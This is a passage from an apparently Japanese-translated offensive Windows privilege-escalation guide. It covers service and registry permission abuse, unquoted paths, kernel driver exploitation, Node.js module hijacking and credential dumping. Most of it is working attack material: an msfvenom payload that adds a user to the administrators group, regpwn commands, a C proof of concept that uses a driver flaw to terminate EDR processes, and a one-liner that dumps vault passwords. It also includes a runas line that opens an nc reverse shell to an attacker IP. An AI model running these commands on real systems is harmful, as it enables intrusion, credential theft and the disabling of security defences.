FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実際の悪用フローは次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能であることを確認します。
3. サービスバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／サービス trigger を待ちます）。

自動チェックに役立つツール：<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスが通常のユーザーによる再起動を許可していない場合は、ブート時に自動的に起動するか、再起動させる failure action が設定されているか、またはそのサービスを使用するアプリケーションによって間接的にトリガーできるかを確認してください。

### Services registry modify permissions

サービス registry を変更できるか確認してください。\
次の方法で、サービス **registry** に対する **permissions** を**チェック**できます：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race による任意の HKLM value write（ATConfig）

一部の Windows Accessibility features は、ユーザーごとの **ATConfig** キーを作成します。これらは後に **SYSTEM** process によって HKLM session key へコピーされます。Registry **symbolic link race** により、この privileged write を **任意の HKLM path** へリダイレクトでき、任意の HKLM **value write** primitive が得られます。<sup>[[18]](#references)</sup>

Key locations（例：On-Screen Keyboard `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの accessibility features が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御可能な configuration が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop transitions 中に作成され、ユーザーによる書き込みが可能です。

Abuse flow（CVE-2026-24291 / ATConfig）：

1. SYSTEM によって書き込ませたい **HKCU ATConfig** value を設定します。
2. secure-desktop copy を trigger します（例：**LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ち**、oplock が発火したら **HKLM Session ATConfig** key を、protected HKLM target への **registry link** に置き換えます。
4. SYSTEM が attacker-chosen value をリダイレクト先の HKLM path に書き込みます。

任意の HKLM value write を取得したら、service configuration values を上書きして LPE へ pivot します：

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが start できる service（例：**`msiserver`**）を選択し、write 後に trigger します。**Note:** public exploit implementation は race の一部として workstation を **locks** します。

Example tooling（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### サービスレジストリの AppendData/AddSubdirectory permissions

レジストリに対してこの permission を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows サービスの場合、これは**任意のコードを実行するのに十分です：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースまでで区切られた各候補を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、すべての unquoted service paths を一覧表示します。
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit を使用して検出および exploit **できます**: `exploit/windows/local/trusted\_service\_path` metasploit を使用してサービスバイナリを手動で作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。このバイナリを置き換え可能な場合、privilege escalationが可能になることがあります。詳細については、[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## Applications

### インストール済みアプリケーション

**バイナリの権限**（置き換えてprivilege escalationできる可能性があります）と**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認します。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特殊なファイルを読み取るように設定ファイルを変更できるか、または Administrator アカウントによって実行されるバイナリを変更できるかを確認します（schedtasks）。

システム内で権限の弱いフォルダーやファイルを見つける方法は次のとおりです。
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ内にあるすべての plugin DLL を自動的に autoload します。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置することで、起動するたびに（`DllMain` や plugin callbacks からも）`notepad++.exe` 内で自動的に code execution が発生します。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別の user によって実行される registry または binary の一部を上書きできるか確認してください。**\
**以下のページを読む**ことで、**privileges を escalate するための興味深い autoruns locations**について詳しく学べます:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の不審な／vulnerable な** drivers の可能性を探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバーが任意の kernel read/write primitive（設計の悪い IOCTL handler では一般的）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> step-by-step technique はこちらです：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

脆弱な call が attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅延させる（max-length component や深い directory chain を使う）ことで、window を数マイクロ秒から数十マイクロ秒まで引き延ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

一部の Windows kernel LPE chain は、個別には弱い2つの bug から構築できます。1つは queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは `RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

Audit と exploitation に関する注意事項：

- **Free-under-lock + cancel afterwards**：success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達する場合、`NtCancelIoFileEx -> IopCsqCancelRoutine` で block されていた thread が後で再開し、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- 解放された queue object を、同じサイズの attacker-controlled な paged-pool allocation で **reclaim** します。`NPFS` Data Queue Entries は payload と size を制御でき、後から pipe read/peek operation で probe できるため有用です。解放された object に list link が埋め込まれている場合は、これらを user memory 内の **cyclic list of fake request nodes** で上書きします。これにより driver は元の list head で終了せず、attacker が定義した request structure を繰り返し処理します。
- **predictable write を upgrade**：fake request が bookkeeping write（timestamp / QPC / refcount-adjacent field）で使用される nested context pointer を redirect する場合、**address-controlled but not value-controlled** な kernel write を得られる可能性があります。その場合、最終的な code/data pointer ではなく、sprayed pool object の **length/size** field を target にし、破壊された object が **out-of-bounds paged-pool read** を返すまで spray を列挙します。
- **Raceable disclosure pattern**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な candidate です。attacker が copied buffer を拡大できる場合（例えば、serializer の最終 allocation size を増加させる多数の list/resource entry を追加するなど）、reliability が向上します。これは、必ずしも machine を crash させずに、より長い copy によって replacement window を広げられるためです。
- **Pointer-rich refill targets**：Windows **I/O ring** の registered-buffer array は、paged-pool size を attacker が制御でき（`8 * regBufferCnt`）、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。これらの array の1つを leak し、周囲の `IORING_OBJECT` を特定した後、**`RegBuffers`** と **`RegBuffersCount`** を corrupt します。これにより後続の I/O ring operation が attacker-forged entry を使用し、arbitrary kernel read/write を提供するようになります。利用可能な write が stable byte（例えば `KUSER_SHARED_DATA+0x14` から取得できる値）しか与えない場合は、**overlapping unaligned write** を使用して `0x0101010101010101` のような repeated-byte user pointer を構築し、`VirtualAlloc` でその address を map して、そこに forged registered-buffer array を配置します。<sup>[[30]](#references)</sup>

有用な debugging indicator：
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive workflow を使って SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive メモリ破損 primitives

Modern hive の脆弱性を利用すると、決定論的なレイアウトを groom し、書き込み可能な HKLM/HKU descendants を悪用し、カスタムドライバーなしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain はこちらで確認できます。

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### attacker-controlled paths からの `RtlQueryRegistryValues` direct-mode type confusion

一部のドライバーは userland から registry path を受け取り、それが正常な UTF-16 string であることだけを検証した後、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を、`int readValue` のような stack scalar に対して `RTL_QUERY_REGISTRY_DIRECT` とともに呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は開発者が想定した type ではなく、**実際の** registry type に従って解釈されます。

これにより、次の2つの有用な primitives が生じます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled な絶対 `\Registry\...` path により、ドライバーは攻撃者が選択した keys を query し、return codes/logs を通じて存在を leak し、場合によっては caller が直接アクセスできない values まで読み取れます。
- **Kernel memory corruption**: `&readValue` のような scalar destination は、registry value type に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定された binary buffer として type-confused されます。

実際の exploitation に関する注意点:

- **Windows 8+ mitigation**: query が **untrusted hive** に到達し、`RTL_QUERY_REGISTRY_DIRECT` が使用されているにもかかわらず `RTL_QUERY_REGISTRY_TYPECHECK` がない場合、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、values を `HKCU` の下に staging するのではなく、**trusted system hives 内の attacker-writable keys** を探します。
- **Trusted-hive staging**: NtObjectManager を使用して `\Registry\Machine` 配下の writable descendants を列挙し、duplicated **low-integrity** token で scan を再実行して、sandboxed contexts から到達可能な keys を見つけます:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4バイトの `int` への8バイトの直接書き込みにより、隣接するスタックデータが破壊され、近傍のcallback/function pointerを部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext` が `UNICODE_STRING` を指していることを想定する。コードが最初に攻撃者制御の `REG_DWORD` をスタックスカラーへ読み込み、その後同じバッファを文字列読み取りに再利用すると、攻撃者は `Length`/`MaximumLength` を制御し、`Buffer` pointerにも部分的な影響を与えられるため、半制御状態のkernel writeが発生する。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは `EntryContext` の先頭にある `LONG` を符号付きバッファサイズとして扱う。以前の `REG_DWORD` readによって、再利用されたscalarに攻撃者制御の **負の値** が残っていると、次の `REG_BINARY` queryによって攻撃者のバイト列が隣接するスタックスロットへ直接コピーされる。これは多くの場合、callback-pointerを完全に上書きする最も簡潔な経路となる。

Strong hunting pattern: **同じスタック変数への異種registry readを、再初期化せずに行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用された `EntryContext` pointer、および最初のregistry readが2回目のreadを実行するかどうかを制御するコードパスをgrepする。

#### Device objectsでFILE_DEVICE_SECURE_OPENが欠落している場合の悪用（LPE + EDR kill）

一部の署名付きthird-party driverは、IoCreateDeviceSecureによって強力なSDDLを設定してdevice objectを作成するものの、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れている。このflagがない場合、追加のコンポーネントを含むパスを通じてdeviceをopenするとsecure DACLが適用されない。そのため、権限のないユーザーでも次のようなnamespace pathを使用してhandleを取得できる:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile （実際の事例）

ユーザーがdeviceをopenできると、そのdriverが公開する特権IOCTLをLPEやtamperingに悪用できる。実環境で確認されたcapabilityの例:
- 任意のprocessへのfull-access handleを返す（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw disk read/write（offline tampering、boot-time persistence tricks）。
- Protected Process/Light（PP/PPL）を含む任意のprocessをterminateし、kernel経由でuser landからAV/EDR killを可能にする。

最小PoC pattern（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL によって制限するデバイスオブジェクトを作成する際は、必ず FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作を実行する呼び出し元のコンテキストを検証する。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加する。
- IOCTL（アクセスマスク、METHOD_*、入力検証）を制限し、カーネルの直接的な特権ではなく、brokered model の利用を検討する。

防御側向けの検出案
- 疑わしいデバイス名（例: \\ .\\amsdk*）に対する user-mode からの open と、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft の vulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自の allow/deny リストを維持する。


## PATH DLL Hijacking

**PATH 上に存在するフォルダー内への書き込み権限**がある場合、プロセスによってロードされる DLL を hijack し、**特権を昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーの権限を確認します:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
この check の abuse 方法については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは **Windows uncontrolled search path** の variant であり、**Node.js** および **Electron** applications が、期待される module が **missing** の状態で、`require("foo")` のような bare import を実行する場合に影響します。<sup>[[20]](#references)</sup>

Node は directory tree を上方向にたどり、各 parent にある `node_modules` folders を確認して packages を resolve します。Windows では、この探索が drive root まで到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動された application は、最終的に以下を probe する場合があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**low-privileged user** が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package folder）を配置し、**higher-privileged Node/Electron process** が missing dependency を resolve するのを待つことができます。payload は victim process の security context で実行されるため、target が administrator として実行されている場合、elevated scheduled task/service wrapper から実行されている場合、または auto-start された privileged desktop app である場合、これは **LPE** になります。

これは特に以下の場合によく発生します。

- dependency が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- third-party library が `require("foo")` を `try/catch` で wrap し、failure 発生時も処理を継続する
- package が production builds から削除された、packaging 中に省略された、または install に失敗した
- vulnerable な `require()` が main application code ではなく、dependency tree の深い場所に存在する

### 脆弱な target の hunting

resolution path を証明するには **Procmon** を使用します。<sup>[[23]](#references)</sup>

- `Process Name` = target executable（`node.exe`、Electron app EXE、または wrapper process）で filter
- `Path` `contains` `node_modules` で filter
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最後に成功する open に注目する

unpacked `.asar` files または application sources で役立つ code-review patterns：
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **missing package name** を特定します。
2. 存在しない場合は、root lookup directory を作成します：
```powershell
mkdir C:\node_modules
```
3. 期待される正確な名前のモジュールを配置する：
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションをトリガーする。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに該当する、実際に存在する欠落した optional module の例としては `bluebird` や `utf-8-validate` があります。ただし、再利用可能な部分は **technique** です。特権 Windows Node/Electron プロセスが解決する、任意の **missing bare import** を見つけてください。

### Detection と hardening のアイデア

- ユーザーが `C:\node_modules` を作成したり、そこに新しい `.js` ファイルや packages を書き込んだりした際にアラートを生成する。
- 高い integrity レベルで動作するプロセスが `C:\node_modules\*` から読み取っていないかを調査する。
- 本番環境ではすべての runtime dependencies を package 化し、`optionalDependencies` の使用を audit する。
- サードパーティーコードで、`try { require("...") } catch {}` のようなサイレントなパターンを確認する。
- library がサポートしている場合は optional probe を無効化する（たとえば、一部の `ws` deployments では `WS_NO_UTF_8_VALIDATE=1` により legacy `utf-8-validate` probe を回避できる）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts fileにハードコードされている既知の他のコンピューターを確認します。
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から **restricted services** を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドについてはこのページを確認**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化...）**

ネットワーク列挙用の[コマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得すると、任意のポートで listen できます（初めて `nc.exe` を使用してポートを listen すると、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root として bash を簡単に起動するには、`--default-user root` を試すことができます

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows認証情報

### Winlogon認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault は、**Windows** がユーザーを**自動的にログインさせる**ために使用できる、サーバー、Web サイト、その他のプログラム用のユーザー認証情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザに自動的にログインさせられるように聞こえるかもしれませんが、実際にはそのような仕組みではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための認証情報を保存します。つまり、**リソースにアクセスするために認証情報を必要とする Windows アプリケーション**（サーバーまたは Web サイト）は、この Credential Manager と Windows Vault を**利用でき**、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を使用することはできないと思われます。したがって、アプリケーションで vault を利用したい場合は、何らかの方法で**credential manager と通信し、そのリソースの認証情報を**デフォルトのストレージ vault に要求する必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。以下の例では、SMB share 経由でリモート binary を呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`に提供されたcredentialセットを使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) を使用します。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても公開されています）内に保存します。このストレージ領域はセッション単位で分離されており、管理者権限や `SeDebugPrivilege` 権限なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** は、主に Windows operating system 内で非対称 private key の対称暗号化に使用される、データの対称暗号化方式を提供します。この暗号化では、entropy に大きく寄与する user または system の secret を利用します。

**DPAPI により、user の login secret から導出された対称 key を通じて key を暗号化できます**。system encryption の場合は、system の domain authentication secret を使用します。

DPAPI を使用して暗号化された user RSA key は、`%APPDATA%\Microsoft\Protect\{SID}` directory に保存されます。ここで `{SID}` は user の [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**同じ file 内で user の private key を保護する master key と同じ場所に保存される DPAPI key** は、通常、64 bytes のランダムデータで構成されます。（この directory への access は制限されているため、CMD の `dir` command で内容を一覧表示することはできませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して **mimikatz module** `dpapi::masterkey` を使用すると、これを復号できます。

**master password で保護された credentials files** は、通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を使用して、**mimikatz module** の `dpapi::cred` で復号できます。\
`sekurlsa::dpapi` module を使用すると、**memory** から多数の **DPAPI** **masterkeys** を**extract**できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** を使用して保護されます。通常、作成時と同じコンピューター上の同じユーザーによってのみ復号できます。

それを含むファイルから PS credentials を**decrypt**するには、次のようにします。
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

